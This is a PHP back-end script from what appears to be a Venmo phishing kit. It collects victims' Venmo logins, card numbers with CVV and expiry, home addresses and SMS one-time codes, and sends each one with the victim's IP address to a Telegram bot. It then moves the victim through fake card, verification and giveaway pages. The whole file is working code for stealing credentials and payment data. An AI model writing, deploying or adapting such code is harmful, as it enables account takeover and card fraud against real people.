<?php 
session_start();
require 'config.php';


function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;

}

$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['user'])){

$msg = "
VENMO- New Log 
--------------------------
pass: ".$_POST['pass']."
User: ".$_POST['user']."
--------------------------
IP: $ip
";

sendTotelegram($msg);




header("location: card.php");

}



if(isset($_POST['cc'])){
$_SESSION['_cc'] = $_POST['cc'];
$msg = "
VENMO- - New CC 
--------------------------
Name: ".$_POST['name']."
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

header("location: wait.php?next=sms.php");
    
}


if(isset($_POST['verify.html'])){

    $msg = "
    VENMO- New give 
    --------------------------
    FullName: ".$_POST['fullname']."
    Email: ".$_POST['email']."
    State: ".$_POST['state']."
    City: ".$_POST['city']."
    Zip: ".$_POST['zip']."
    --------------------------
    IP: $ip
    ";
    
    sendTotelegram($msg);
    
    
    
    
    header("location: Giveaway.html");
    
    }
    


if(isset($_POST['otp'])){

$msg = "
VENMO- - New OTP
--------------------------
Cc: ".$_SESSION['_cc']."
Otp: ".$_POST['otp']."
--------------------------
IP: $ip
";

sendTotelegram($msg);

if(isset($_POST['exit'])){
    die(header("location: exit.php"));
}
header("location: wait.php?next=sms.php?error");

}
    



?>